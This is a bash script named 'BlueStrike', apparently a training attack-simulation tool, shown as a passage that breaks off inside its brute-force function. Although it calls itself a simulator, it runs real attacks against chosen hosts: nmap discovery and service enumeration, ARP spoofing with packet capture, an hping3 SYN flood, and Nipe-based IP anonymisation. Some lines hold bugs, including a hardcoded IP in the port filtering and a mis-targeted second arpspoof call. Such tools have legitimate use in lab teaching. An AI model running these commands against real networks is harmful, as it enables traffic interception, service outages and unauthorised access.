#!/bin/bash

###############################################################
# Domain Mapper 
# Author: Michael Pritsert
# GitHub: https://github.com/mishap2001
# LinkedIn: https://www.linkedin.com/in/michael-pritsert-8168bb38a
# License: MIT License
###############################################################

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
BOLD='\e[1m'
ENDCOLOR='\e[0m' 
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] This script must be run as root${ENDCOLOR}"
  exit 
fi
echo -e "${RED}==============================================${ENDCOLOR}"
printf ${BLUE}${BOLD}
figlet "BlueStrike"
printf ${ENDCOLOR}
echo -e "${RED}==============================================${ENDCOLOR}"

function MANUAL() # Manual
{
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Available Attack Simulations${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${MAGENTA}[1]${ENDCOLOR} Scanning and Enumeration"
echo -e "${MAGENTA}[2]${ENDCOLOR} Man-in-the-Middle (MiTM) – Packet Collection"
echo -e "${MAGENTA}[3]${ENDCOLOR} Denial of Service (DoS)"
echo -e "${MAGENTA}[4]${ENDCOLOR} Brute Force (BF)"
echo -e "${MAGENTA}[5]${ENDCOLOR} Password Spraying"
echo
echo -ne "${BOLD}Choose an option to view its explanation or press 99 to skip:${ENDCOLOR} "
read -r attack_choice
echo
case "$attack_choice" in
	1)
		echo -e "${YELLOW}${BOLD}Scanning and Enumeration:${ENDCOLOR}"
		echo -e "  Scanning and enumeration is the phase in which an"
		echo -e "  attacker gathers detailed information about a target"
		echo -e "  system in order to understand exposed services and"
		echo -e "  potential attack surfaces before initiating an attack."
		echo
		echo -e "${YELLOW}${BOLD}What the simulator does:${ENDCOLOR}"
		echo -e "  [*] Prompts you to select a target IP (or random target)"
		echo -e "  [*] Checks which common service ports are open on"
		echo -e "      the target system"
		echo -e "  [*] Automatically executes relevant enumeration"
		echo -e "      scripts only against ports that are detected"
		echo -e "      as open"
		echo -e "  [*] Focuses enumeration on the following services:"
		echo -e "      21, 22, 23, 3389, 5900, 80, 443, 3306, 5432, 445"
	;;
	2)
		echo -e "${YELLOW}${BOLD}MiTM:${ENDCOLOR}"
		echo -e "  A Man-in-the-Middle attack occurs when an attacker"
		echo -e "  positions themselves logically between a target host"
		echo -e "  and the network infrastructure, enabling observation"
		echo -e "  of network traffic."
		echo
		echo -e "${YELLOW}${BOLD}What the simulator does:${ENDCOLOR}"
		echo -e "  [*] Prompts you to select a target IP (or random target)"
		echo -e "  [*] Prompts you to choose a duration"
		echo -e "  [*] Automatically starts a timed packet collection simulation"
	;;
    3)
		echo -e "${YELLOW}${BOLD}DoS:${ENDCOLOR}"
		echo -e "  A Denial of Service attack aims to disrupt the"
		echo -e "  availability of a network service by overwhelming it"
		echo -e "  with excessive traffic or requests."
		echo
		echo -e "${YELLOW}${BOLD}What the simulator does:${ENDCOLOR}"
		echo -e "  [*] Prompts you to select a target IP (or random target)"
		echo -e "  [*] Simulates scanning the target for open ports"
		echo -e "  [*] Presents a port menu: 22, 23, 80, 445, random, or custom"
		echo -e "  [*] Automatically initializes the simulation"
	;;
    4)
		echo -e "${YELLOW}${BOLD}Brute Force:${ENDCOLOR}"
		echo -e "  A Brute Force attack targets authentication mechanisms"
		echo -e "  by systematically attempting multiple credential"
		echo -e "  combinations to gain access."
		echo
		echo -e "${YELLOW}${BOLD}What the simulator does:${ENDCOLOR}"
		echo -e "  [*] Prompts you to select a target IP (or random target)"
		echo -e "  [*] Simulates checking open ports and identifying services"
		echo -e "  [*] Lets you choose a service by port number (or random)"
		echo -e "  [*] Prompts for a username list path"
		echo -e "  [*] Simulates creating a small password list and executing"
	;;
	5)
		echo -e "${YELLOW}${BOLD}Password Spraying:${ENDCOLOR}"
		echo -e "  Password spraying is an authentication attack in which"
		echo -e "  a single password is tested across many usernames to"
		echo -e "  identify weak or reused credentials while reducing the"
		echo -e "  likelihood of account lockouts compared to brute force."
		echo
		echo -e "${YELLOW}${BOLD}What the simulator does:${ENDCOLOR}"
		echo -e "  [*] Prompts you to select a target IP (or random target)"
		echo -e "  [*] Checks which common authentication ports are open"
		echo -e "      on the target system before executing"
		echo -e "  [*] Prompts you to provide a user list path"
		echo -e "  [*] Prompts you to provide a single password to test"
		echo -e "  [*] Executes the simulation only on the selected services:"
		echo -e "      21 (FTP), 22 (SSH), 445 (SMB)"
	;;
    99)
		NET_INFO
		break
	;;
esac
echo
echo -e "${MAGENTA}[1]${ENDCOLOR} Back (choose another option)"
echo -e "${GREEN}[99]${ENDCOLOR} Continue with the simulation"
while true; do
read -r next_choice
case "$next_choice" in
    1)
		continue 2
	;;
    99)
		NET_INFO
		break 2
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
done
}
             
function NET_INFO() # Network information gathering
{
echo "==========================Network Information===========================" >> /var/log/BlueStrike.log
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Network Range Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Enter The Target Network Range (examples):"
echo -e "    [*] 1.2.3.0-255"
echo -e "    [*] 1.2.3.0/24"
echo -e "    [*] 1.2.3.*"
echo
read network_range
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Range Validation${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
if nmap -sL -n "$network_range" 2>&1 | grep -q "Failed to resolve"; then
	echo -e "${RED}[!]${ENDCOLOR} The chosen range is not valid."
	echo
	echo -e "${RED}${BOLD}EXITING${ENDCOLOR}"
	exit
else
	echo "$(date) - The user entered the range $network_range" >> /var/log/BlueStrike.log # log
	echo -e "${GREEN}[*]${ENDCOLOR} This is a valid range"
	echo
fi
echo -e "${YELLOW}[!]${ENDCOLOR} Target range selected: ${YELLOW}$network_range${ENDCOLOR}"
echo
sleep 1
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Live Host Discovery${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Searching for live hosts..."
nmap -sn "$network_range" | awk '{print $5}' | grep ^[0-9] > live_hosts.txt
live_num=$(cat live_hosts.txt | wc -l)
echo
echo -e "${YELLOW}[*]${ENDCOLOR} The live hosts are:"
echo "[*] Live hosts:" > "GENERAL INFO.txt"
cat live_hosts.txt | tee -a "GENERAL INFO.txt"
echo -e "${YELLOW}[!]${ENDCOLOR} Total number of live hosts discovered: ${YELLOW}$live_num${ENDCOLOR}"
echo "$(date) - Found $live_num live hosts" >> /var/log/BlueStrike.log # log

# DHCP Detection
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Infrastructure Identification${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${GREEN}[*]${ENDCOLOR} Identifying the DHCP server IP..."
nmap --script=broadcast-dhcp-discover >> "GENERAL INFO.txt" 2>/dev/null
dhcp_ip=$(grep 'Server Identifier' "GENERAL INFO.txt" | awk '{print $4}')
echo
echo -e "${GREEN}[*]${ENDCOLOR} DHCP Server: ${YELLOW}$dhcp_ip${ENDCOLOR}"
echo "[*] The IP of the DHCP is $dhcp_ip" >> "GENERAL INFO.txt"
echo "$(date) - DHCP was identified - $dhcp_ip" >> /var/log/BlueStrike.log # log

# DNS Detection
echo
echo -e "${GREEN}[*]${ENDCOLOR} Identifying the DNS server IP..."
sleep 1
dns_ip=$(grep 'Domain Name Server' "GENERAL INFO.txt" | awk '{print $5}')
echo
echo -e "${GREEN}[*]${ENDCOLOR} DNS Server: ${YELLOW}$dns_ip${ENDCOLOR}"
echo "[*] The IP of the DNS is $dns_ip" >> "GENERAL INFO.txt"
echo "$(date) - DNS was identified - $dns_ip" >> /var/log/BlueStrike.log # log

# Default Gateway Detection
echo
echo -e "${GREEN}[*]${ENDCOLOR} Identifying the Default Gateway IP..."
sleep 1
router_ip=$(grep 'Router' "GENERAL INFO.txt" | awk '{print $3}')
echo
echo -e "${GREEN}[*]${ENDCOLOR} Default Gateway: ${YELLOW}$router_ip${ENDCOLOR}"
echo "[*] The IP of the Default Gateway is $router_ip" >> "GENERAL INFO.txt"
echo "$(date) - Default Gateway was identified - $router_ip" >> /var/log/BlueStrike.log # log

echo
echo -e "${YELLOW}[!]${ENDCOLOR} All network information is saved under ${YELLOW}'GENERAL INFO.txt'${ENDCOLOR}"
echo
}     
 
 function ANON() # Anonymity option
{
echo "============================Anunomity Check=============================" >> /var/log/BlueStrike.log				
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Anunomity Check${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
IP=$(curl -s ifconfig.co) # real IP address
GPS=$(geoiplookup "$IP" | awk '{print $4, $5, $6}') # real location 

if geoiplookup "$IP" | grep -iq israel; then
echo -ne "[*] You are not anonymous. Would yo like to become one? (Y/N)" 
echo "$(date) - User is not anonymous" >> /var/log/BlueStrike.log		
while true; do
read -r answer
echo
case "$answer" in
	y|Y)
		echo "$(date) - Initiating anonymous mode" >> /var/log/BlueStrike.log
		echo -e "[*] Becoming anonymous..."
		cd /home/kali/nipe
		sudo perl nipe.pl start
		sudo perl nipe.pl restart
		echo -e "[!] Anonymous mode - ${GREEN}ACTIVE${ENDCOLOR}"
		echo "$(date) - Anonymous mode - ACTIVE" >> /var/log/BlueStrike.log
		IP_NIPE=$(curl -s ifconfig.co)
		echo -e "[*] Your spoofed IP address is - $IP_NIPE"
		GPS_NIPE=$(geoiplookup "$IP_NIPE" | awk '{print $4, $5, $6}')		
		echo -e "[*] Your spoofed location is - $GPS_NIPE"
		echo "$(date) - IP: $IP_NIPE, Location: $GPS_NIPE" >> /var/log/BlueStrike.log
		cd - > /dev/null 2>&1
		break 			
	;;
	n|N)
		echo -e "Continuing..."
		echo "$(date) - User chose to stay identified" >> /var/log/BlueStrike.log
		echo "$(date) - Anonymous mode - INACTIVE" >> /var/log/BlueStrike.log
		break
	;;
	*)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -ne "${RED}Would yo like to become anonymous? (Y/N)${ENDCOLOR}"
		echo
	;;
esac
done
else 
	echo
	echo -e "[*] You are anonymous. Continuing..."
	echo
fi
echo
}
            
function MENU() # Attack menu
{
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Choose an Attack Type${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${MAGENTA}[1]${ENDCOLOR} Scanning and Enumeration"
echo -e "${MAGENTA}[2]${ENDCOLOR} Man-in-the-Middle (MiTM)"
echo -e "${MAGENTA}[3]${ENDCOLOR} Denial of Service (DoS)"
echo -e "${MAGENTA}[4]${ENDCOLOR} Brute Force (BF)"
echo -e "${MAGENTA}[5]${ENDCOLOR} Password Spraying"
echo
echo -ne "${BOLD}Select an attack to simulate:${ENDCOLOR} "
read -r attack_choice
case "$attack_choice" in
	1)
		ENUM
		break
	;;
	2)
		ARP
		break
	;;
	3)
		DoS
		break
	;;
	4)
		BF
		break
	;;
	5)
		PS
		break
	;;
	*)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
}

function ENUM() # Scanning and Enumeration function
{
echo "========================Scanning and Enumeration========================" >> /var/log/BlueStrike.log
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Scanning and Enumeration${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Target Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} Choose target IP"
echo -e "${YELLOW}[2]${ENDCOLOR} Choose one randomly from the live hosts"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read -r arp_tar
echo
case $arp_tar in
	1)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choose an IP address: "
		line=0
		for ip in $(cat live_hosts.txt); do
			line=$((line + 1))
			echo "[$line] $ip"
		done
		echo
		echo -ne "${BOLD}Choice: ${ENDCOLOR}"
		read -r ip_cho
		target_IP=$(awk "NR==$ip_cho" live_hosts.txt)
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    2)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random IP address..."
		echo
		target_IP=$(shuf -n 1 live_hosts.txt)
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
echo
echo -e "${YELLOW}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}Port Discovery${ENDCOLOR}"
echo -e "${YELLOW}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Initiating port discovery..."
echo
nmap -p 21,22,23,80,443,445,3306,3389,5432,5900 "$target_IP" > "$target_IP"
echo "$(date) - Found available ports" >> /var/log/BlueStrike.log
echo
echo -e "${YELLOW}Filtering Open Ports${ENDCOLOR}"
echo -e "${YELLOW}----------------------------------------------------${ENDCOLOR}"
open_ports=$(grep open 192.168.178.134 | awk -F/ '{print $1}')
echo -e "${YELLOW}[*]${ENDCOLOR} Starting enumeration for open ports..."
for p in 21 22 23 80 443 445 3306 3389 5432 5900; do
echo "$open_ports" | grep -qw "$p" || continue
case "$p" in
	21)
		echo
		echo -e "${RED}[!] Enumerating port 21 - FTP${ENDCOLOR}"
		nmap -p 21 --script=ftp-anon "$target_IP" > "Scan_Enum_RES.txt" # FTP
		echo "$(date) - Enumerated port 21" >> /var/log/BlueStrike.log # log
	;;
	22) 
		echo
		echo -e "${RED}[!] Enumerating port 22 - SSH${ENDCOLOR}"
		nmap -p 22 --script=ssh-auth-methods "$target_IP" >> "Scan_Enum_RES.txt" # SSH
		echo "$(date) - Enumerated port 22" >> /var/log/BlueStrike.log # log
	;;
	23)
		echo
		echo -e "${RED}[!] Enumerating port 23 - Telnet${ENDCOLOR}"
		nmap -p 23 --script=telnet-ntlm-info "$target_IP" >> "Scan_Enum_RES.txt" # Telnet
		echo "$(date) - Enumerated port 23" >> /var/log/BlueStrike.log # log
	;;
	80)
		echo
		echo -e "${RED}[!] Enumerating port 80 - HTTP${ENDCOLOR}"
		nmap -p 80 --script=http-methods "$target_IP" >> "Scan_Enum_RES.txt" # HTTP
		echo "$(date) - Enumerated port 80" >> /var/log/BlueStrike.log # log
	;;
	443)
		echo
		echo -e "${RED}[!] Enumerating port 443 - HTTPS${ENDCOLOR}"
		nmap -p 443 --script=ssl-enum-ciphers "$target_IP" >> "Scan_Enum_RES.txt" # HTTPS
		echo "$(date) - Enumerated port 443" >> /var/log/BlueStrike.log # log
	;;
	445)
		echo
		echo -e "${RED}[!] Enumerating port 445 - SMB${ENDCOLOR}"
		nmap -p 445 --script=smb-security-mode "$target_IP" >> "Scan_Enum_RES.txt" # SMB
		echo "$(date) - Enumerated port 445" >> /var/log/BlueStrike.log # log
	;;
	3306)
		echo
		echo -e "${RED}[!] Enumerating port 3306 - MySQL${ENDCOLOR}"
		nmap -p 3306 -sV "$target_IP" >> "Scan_Enum_RES.txt" # MySQL
		echo "$(date) - Enumerated port 3306" >> /var/log/BlueStrike.log # log
	;;
	3389)
		echo
		echo -e "${RED}[!] Enumerating port 3389 - RDP${ENDCOLOR}"
		nmap -p 3389 --script=rdp-enum-encryption "$target_IP" >> "Scan_Enum_RES.txt" # RDP
		echo "$(date) - Enumerated port 3389" >> /var/log/BlueStrike.log # log
	;;
	5432)
		echo
		echo -e "${RED}[!] Enumerating port 5432 - PostgreSQL${ENDCOLOR}"
		nmap -p 5432 -sV --script-args pgsql.username=postgres "$target_IP" >> "Scan_Enum_RES.txt" # PostgreSQL
		echo "$(date) - Enumerated port 5432" >> /var/log/BlueStrike.log # log
	;;
	5900)
		echo
		echo -e "${RED}[!] Enumerating port 5900 - VNC${ENDCOLOR}"
		nmap -p 5900 --script=vnc-info "$target_IP" >> "Scan_Enum_RES.txt" # VNC
		echo "$(date) - Enumerated port 5900" >> /var/log/BlueStrike.log # log
	;;
esac
done
echo "$(date) - Finished enumeration of open ports" >> /var/log/BlueStrike.log # log
echo
echo -e "${GREEN}[*]${ENDCOLOR} Finished enumeration of open ports"
}

function ARP() # MiTM attack function
{
echo "==============================MiTM Attack==============================" >> /var/log/BlueStrike.log
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}MiTM Attack${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${GREEN}[*] Enabling IP forwarding...${ENDCOLOR}"
sleep 1
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "${YELLOW}[!] IP Forwarding Enabled${ENDCOLOR}"
echo "$(date) - IP Forwarding enabled" >> /var/log/BlueStrike.log
echo
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Target Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} Choose target IP"
echo -e "${YELLOW}[2]${ENDCOLOR} Choose one randomly from the live hosts"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read -r arp_tar
echo
case $arp_tar in
	1)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choose an IP address: "
		line=0
		for ip in $(cat live_hosts.txt); do
			line=$((line + 1))
			echo "[$line] $ip"
		done
		echo
		echo -ne "${BOLD}Choice: ${ENDCOLOR}"
		read -r ip_cho
		target_IP=$(awk "NR==$ip_cho" live_hosts.txt)
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    2)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random IP address..."
		echo
		target_IP=$(shuf -n 1 live_hosts.txt)
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
echo "$(date) - The target IP is ${target_IP}" >> /var/log/BlueStrike.log # log 
echo "$(date) - The default gateway IP is ${router_ip}" >> /var/log/BlueStrike.log # log 
echo
echo -ne "${YELLOW}[*]${ENDCOLOR} Enter the desired duration of the attack (IN SECONDS): "
read -r duration
echo
echo "$(date) - Chosen attack duration - ${duration} seconds" >> /var/log/BlueStrike.log # log
echo -e "${GREEN}[*]${ENDCOLOR} Attack duration set to ${YELLOW}${duration}${ENDCOLOR} seconds"
echo

# start of the attack
echo -e "${RED}${BOLD}[!] Commencing MiTM attack${ENDCOLOR}"
echo -e "${RED}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo "$(date) - MiTM attack initiated" >> /var/log/BlueStrike.log # log 

# arpspoofing the target
timeout "$duration" arpspoof -i eth0 -t "$target_IP" "$router_ip" > /dev/null 2>&1 &
echo
echo "$(date) - Arpspoofed the target" >> /var/log/BlueStrike.log # log 
echo -e "${YELLOW}[*]${ENDCOLOR} Arpspoofed the target"

# arpspoofing the router
timeout "$duration" arpspoof -i eth0 -t "$target_IP" ${target_IP} > /dev/null 2>&1 &
echo
echo "$(date) - Arpspoofed the default gateway" >> /var/log/BlueStrike.log # log 
echo -e "${YELLOW}[*]${ENDCOLOR} the default gateway"

# capturing packets
echo
echo -e "${YELLOW}[*]${ENDCOLOR} Capturing packets"
echo "$(date) - packet collecting initialized" >> /var/log/BlueStrike.log # log 
tshark -i eth0 -a duration:"$duration" -w /tmp/MiTM.pcap 2>/dev/null &

# timer
echo
for ((i=duration; i>0; i--)); do
  echo -ne "\r$i seconds left"
  sleep 1
done
echo -ne "${GREEN}${BOLD}\r[!] DoS Attack Finished          \n${ENDCOLOR}"
echo -e "${GREEN}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo "$(date) - packet collecting initialized" >> /var/log/BlueStrike.log # log 
echo "$(date) - MiTM attack finished" >> /var/log/BlueStrike.log # log 
mv /tmp/MiTM.pcap $(pwd)/MiTM.pcap
echo "$(date) - Moved .pcap file from /tmp to $(pwd)" >> /var/log/BlueStrike.log # log 
# giving all users permissions to read the file because it was executed by root
chmod 444 $(pwd)/MiTM.pcap
}

function DoS() # DoS attack function
{
echo "===============================DoS Attack===============================" >> /var/log/BlueStrike.log
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}DoS Attack${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
while true; do  
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Target Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} Choose target IP"
echo -e "${YELLOW}[2]${ENDCOLOR} Choose one randomly from the live hosts"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read -r arp_tar
echo
case $arp_tar in
	1)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choose an IP address: "
		line=0
		for ip in $(cat live_hosts.txt); do
			line=$((line + 1))
			echo "[$line] $ip"
		done
		echo
		echo -ne "${BOLD}Choice: ${ENDCOLOR}"
		read -r ip_cho
		target_IP=$(awk "NR==$ip_cho" live_hosts.txt)
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
	2)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random IP address..."
		echo
		target_IP=$(shuf -n 1 live_hosts.txt)
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Port Discovery${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Searching for available ports to attack..."
echo
nmap "$target_IP" > "$target_IP"
echo "$(date) - Found available ports" >> /var/log/BlueStrike.log # log
open_ports=$(grep open 192.168.178.134 | awk -F '/' '{print $1}')
echo
echo -e "${YELLOW}[*]${ENDCOLOR} The next ports are available:"
echo -e "    ${YELLOW}$open_ports${ENDCOLOR}"
echo
echo -e "${YELLOW}[*]${ENDCOLOR} Choose a port to attack"
echo

while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}DoS Port Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} 22  - SSH Service"
echo -e "${YELLOW}[2]${ENDCOLOR} 23  - Telnet Service"
echo -e "${YELLOW}[3]${ENDCOLOR} 80  - Web Server"
echo -e "${YELLOW}[4]${ENDCOLOR} 445 - SMB service"
echo -e "${YELLOW}[5]${ENDCOLOR} Random"
echo -e "${YELLOW}[6]${ENDCOLOR} Other - If chosen, specify a port number from the available list"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read dos_ans
echo
case $dos_ans in
	1) port=22; break ;;
	2) port=23; break ;;	
	3) port=80; break ;;	
	4) port=445; break ;;	
	5)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random port..."
		echo
		list=(22 23 80 445)
		port="${list[RANDOM % ${#list[@]}]}"
		break
	;;
	6)
		echo -ne "[*] Please specify a port number"
		read -r port
		break
	;;
	*)
		echo -e "${RED}Invalid input${ENDCOLOR}"
	    echo -e "${RED}Choose from the available options${ENDCOLOR}"
	    echo
	;;
esac	
done

echo "$(date) - DoS attack on port $port initialized" >> /var/log/BlueStrike.log # log
echo -e "${RED}${BOLD}[!] Commencing a DoS attack on port $port${ENDCOLOR}"
echo -e "${RED}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
sudo hping3 -i u40 -S -p "$port" -c 10000 -q "$target_IP"
echo
echo -e "${GREEN}${BOLD}[!] DoS Attack Finished${ENDCOLOR}"
echo -e "${GREEN}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo "$(date) - DoS attack finished" >> /var/log/BlueStrike.log # log
}

function BF() # Brute-Force function
{
echo "==============================Brute-Force==============================" >> /var/log/BlueStrike.log	
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Brute-Force Attack${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Target Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} Choose target IP"
echo -e "${YELLOW}[2]${ENDCOLOR} Choose one randomly from the live hosts"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read -r arp_tar
echo
case $arp_tar in
	1)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choose an IP address: "
		line=0
		for ip in $(cat live_hosts.txt); do
			line=$((line + 1))
			echo "[$line] $ip"
		done
		echo
		echo -ne "${BOLD}Choice: ${ENDCOLOR}"
		read -r ip_cho
		target_IP=$(awk "NR==$ip_cho" live_hosts.txt)
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    2)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random IP address..."
		echo
		target_IP=$(shuf -n 1 live_hosts.txt)
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
echo "$(date) - The target IP is $target_IP" >> /var/log/BlueStrike.log # log
echo -e "${YELLOW}[*]${ENDCOLOR} Target: ${YELLOW}$target_IP${ENDCOLOR}"
echo

echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Port Discovery${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Searching for available ports..."
echo
nmap "$target_IP" > "$target_IP"
echo "$(date) - Found available ports" >> /var/log/BlueStrike.log # log
open_ports=$(grep open "$target_IP" | awk -F '/' '{print $1}' | paste -sd,)
echo -e "${GREEN}[*]${ENDCOLOR} Open ports detected."
echo

echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Service Enumeration${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Enumerating services..."
echo
nmap -sV -p "$open_ports" "$target_IP" > "$target_IP"
echo "$(date) - Enumerated services" >> /var/log/BlueStrike.log # log
echo -e "${GREEN}[*]${ENDCOLOR} Service enumeration completed."
echo
echo -e "${YELLOW}[*]${ENDCOLOR} The next services are available:"
echo
services="$(grep open $target_IP | awk '{print $1, $3}' | sed 's|/tcp||')"
IFS=$'\n'
for s in $services; do
  echo -e "  ${YELLOW}[*]${ENDCOLOR} $s"
done
unset IFS
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Service Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -ne "${YELLOW}[*]${ENDCOLOR} Enter the port number of the service to target: "
while true; do
read -r port
if echo "$open_ports" | grep -qw "$port"; then
	echo
	echo -e "${YELLOW}[*]${ENDCOLOR} Chosen port - ${YELLOW}$port${ENDCOLOR}"
	serv_tar="$(grep "^$port/" $target_IP | awk '{print $3}' | sed 's|/tcp||')" # greping only the service name
	echo -e "${YELLOW}[*]${ENDCOLOR} Chosen service - ${YELLOW}$serv_tar${ENDCOLOR}"
	break
else
